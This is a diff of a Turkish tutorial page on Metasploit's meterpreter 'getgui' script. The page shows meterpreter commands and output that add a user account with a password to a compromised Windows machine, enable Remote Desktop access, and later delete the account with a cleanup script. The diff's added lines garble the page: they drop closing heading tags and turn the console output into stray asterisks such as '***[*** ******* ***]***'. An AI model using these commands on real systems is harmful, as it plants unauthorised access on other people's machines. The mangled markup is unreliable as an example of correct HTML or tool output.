@@ -42,14 +42,14 @@ url: /tr/msf-remote-desktop-modulu/
  
 
  
-<h2 class="wp-block-heading" id="getgui-aracı"><code>getgui</code>&nbsp;Aracı</h2>
+<h2 class="wp-block-heading" id="getgui-aracı"><code>getgui</code>&nbsp;Aracı
 <!-- /wp:heading -->
 
   Öncelikle&nbsp;<code>getgui</code>&nbsp;yardım başlıklarına bakalım. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run getgui -h
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run getgui -h
 Windows Remote Desktop Enabler Meterpreter Script
 Usage: getgui -u  -p 
 Or:    getgui -e
@@ -66,30 +66,30 @@ OPTIONS:
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="getgui-kullanıcı-ekleme"><code>getgui</code>&nbsp;Kullanıcı Ekleme</h2>
+<h2 class="wp-block-heading" id="getgui-kullanıcı-ekleme"><code>getgui</code>&nbsp;Kullanıcı Ekleme
 <!-- /wp:heading -->
 
   Genel olarak kullanımda&nbsp;<code>-u</code>&nbsp;kullanıcı adını,&nbsp;<code>-p</code>&nbsp;parolayı belirtmek için kullanılır.&nbsp;<code>getgui</code>&nbsp;komutunu aşağıdaki örneğe benzer şekilde kullandığınızda sisteme yeni bir kullanıcı eklemiş olursunuz. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run getgui -u loneferret -p password
-<strong>[</strong><strong>*</strong><strong>]</strong> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
-<strong>[</strong><strong>*</strong><strong>]</strong> Carlos Perez carlos_perez@darkoperator.com
-<strong>[</strong><strong>*</strong><strong>]</strong> Language detection started
-<strong>[</strong><strong>*</strong><strong>]</strong>   Language detected: en_US
-<strong>[</strong><strong>*</strong><strong>]</strong> Setting user account <strong>for </strong>logon
-<strong>[</strong><strong>*</strong><strong>]</strong>   Adding User: loneferret with Password: password
-<strong>[</strong><strong>*</strong><strong>]</strong>   Adding User: loneferret to local group ''
-<strong>[</strong><strong>*</strong><strong>]</strong>   Adding User: loneferret to local group ''
-<strong>[</strong><strong>*</strong><strong>]</strong> You can now login with the created user
-<strong>[</strong><strong>*</strong><strong>]</strong> For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run getgui -u loneferret -p password
+***[*** ******* ***]***  Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+***[*** ******* ***]***  Carlos Perez carlos_perez@darkoperator.com
+***[*** ******* ***]***  Language detection started
+***[*** ******* ***]***    Language detected: en_US
+***[*** ******* ***]***  Setting user account ***for *** logon
+***[*** ******* ***]***    Adding User: loneferret with Password: password
+***[*** ******* ***]***    Adding User: loneferret to local group ''
+***[*** ******* ***]***    Adding User: loneferret to local group ''
+***[*** ******* ***]***  You can now login with the created user
+***[*** ******* ***]***  For cleanup use command: run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="rdesktop-bağlantısı"><code>rdesktop</code>&nbsp;Bağlantısı</h2>
+<h2 class="wp-block-heading" id="rdesktop-bağlantısı"><code>rdesktop</code>&nbsp;Bağlantısı
 <!-- /wp:heading -->
 
   Artık kullanıcı oluşturuldu. Aynı ağda bulunan başka bir bilgisayardan, bu kullanıcı adı ve parolayı kullanarak uzak masaüstü bağlantısı yapabilirsiniz. 
@@ -111,9 +111,9 @@ meterpreter <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
-<strong>[</strong><strong>*</strong><strong>]</strong> Running Command List ...
-<strong>[</strong><strong>*</strong><strong>]</strong>   Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+***[*** ******* ***]***  Running Command List ...
+***[*** ******* ***]***    Running command execute -H -f cmd.exe -a "/c net user hacker /delete"
 Process 288 created.
-meterpreter <strong>&gt;</strong></code></pre>
+meterpreter ***&gt;*** </code></pre>
 <!-- /wp:code -->
